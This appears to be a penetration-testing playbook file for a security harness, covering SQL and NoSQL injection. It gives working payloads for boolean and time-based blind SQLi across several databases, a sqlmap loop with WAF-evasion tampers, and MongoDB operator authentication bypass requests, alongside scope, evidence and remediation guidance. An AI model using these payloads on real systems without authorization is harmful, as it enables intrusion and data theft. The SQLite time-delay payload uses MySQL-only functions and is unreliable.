---
name: web-sqli-blind-polyglot
description: SQL and NoSQL injection testing, Boolean-based and time-based blind extraction, stacked queries, ORM bypasses, and NoSQL operator injection.
playbook: web-security
---

# SQL & NoSQL Injection: Blind, Polyglot, & Operator Exploitation

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified target endpoints, query parameters, JSON payload keys, and database tiers in `.hacker-harness/scope.yaml`.
- **Target Parameters:** User-supplied filters, search bars, sorting columns (`ORDER BY`), pagination (`OFFSET`), and JSON filter objects (from `psqli.txt`).
- **Traffic Routing:** Route all test payloads through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Baseline & Syntax Breaking
Inject single quotes, double quotes, backslashes, and comments to observe database syntax anomalies:
```text
' OR '1'='1
" OR "1"="1
' OR 1=1-- -
admin'--
1' AND 1=1--
1' AND 1=2--
```
Observe response differences: HTTP status code, page length, error messages (e.g. `syntax error at or near`, `ORA-01756`, `Unclosed quotation mark`).

### Step 2: Automated Blind Scanner (BSQLi 2.0 & SQLMap) (E1)
On candidate endpoints saved in `Recon/psqli.txt`, run automated verification:

```bash
# 1. BSQLi 2.0 — fast blind SQLi verification with payload generation
python3 /home/kali/Tools/BSQLi-2.0/src/bsqli2.0.py \
  -l Recon/psqli.txt \
  --generate-payloads -o Recon/target_bsqli_results.csv

# 2. SQLMap Multi-Tamper Stack for WAF Evasion
cat Recon/psqli.txt | while read url; do
  sqlmap -u "$url" \
    --dbs --random-agent --tamper=between,randomcase,space2comment \
    --time-sec=5 --batch --level=3 --risk=2 2>/dev/null | tee -a Recon/target_sqli_exploited.txt
done
```

### Step 3: Boolean-Based Blind Differentiation
Construct True vs. False conditional expressions:
```http
# True condition (returns baseline data or HTTP 200)
GET /api/v1/items?category=books'+AND+1=1--+- HTTP/1.1
Host: target.example.com

# False condition (returns empty results, 404, or alternate length)
GET /api/v1/items?category=books'+AND+1=2--+- HTTP/1.1
Host: target.example.com
```

### Step 4: Time-Based Blind Extraction
Inject database-specific sleep/delay functions when error messages and content differences are suppressed:
- **PostgreSQL:** `'; SELECT pg_sleep(5);--` or `'+(SELECT 1 FROM pg_sleep(5))+'`
- **MySQL / MariaDB:** `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--`
- **Microsoft SQL Server:** `'; WAITFOR DELAY '0:0:5';--`
- **Oracle:** `' AND 1=dbms_pipe.receive_message(('a'),5)--`
- **SQLite:** `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (CASE WHEN (1=1) THEN RANDOMBLOB(500000000/2) ELSE 0 END)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`

### Step 5: NoSQL Operator Injection (MongoDB / CouchDB)
When interacting with JSON or form-encoded REST APIs:
```http
# Authentication Bypass via $ne or $gt
POST /api/v1/login HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid_pass"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Regex Extraction
{"username": "admin", "token": {"$regex": "^a.*"}}
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Injection Context | Vulnerability Root Cause | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **`ORDER BY` Clause Injection** | Parameterized queries cannot parameterize column identifiers | `?sort=(CASE+WHEN+(1=1)+THEN+name+ELSE+id+END)` | Differential sorting orders observed |
| **JSON/NoSQL Object Injection** | Unchecked parsing of JSON into query filter | `POST {"user": {"$in": ["admin", "root"]}}` | Unauthorized session token generation |
| **Second-Order SQLi in Profile** | Data stored safely but concatenated in backend worker | Update username to `admin'--` $\rightarrow$ trigger billing invoice report | Admin billing report generated or SQL error in logs |
| **GraphQL JSON Argument Injection** | Raw string interpolation inside GraphQL resolver | `query { user(filter: "{id: '1' OR '1'='1'}") { email } }` | Multiple user records returned |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture both True and False HTTP requests/responses (or time-delay measurement graphs) demonstrating controlled execution.
2. **Impact Proof:** Extract benign metadata (e.g. `@@version`, `current_user()`, `SELECT 1`) without modifying or dropping database tables.
3. **Remediation:** Enforce parameterized queries (Prepared Statements / ORM parameter binding), validate column names against strict allowlists for `ORDER BY`, and sanitize JSON input types to prevent NoSQL operator injection.
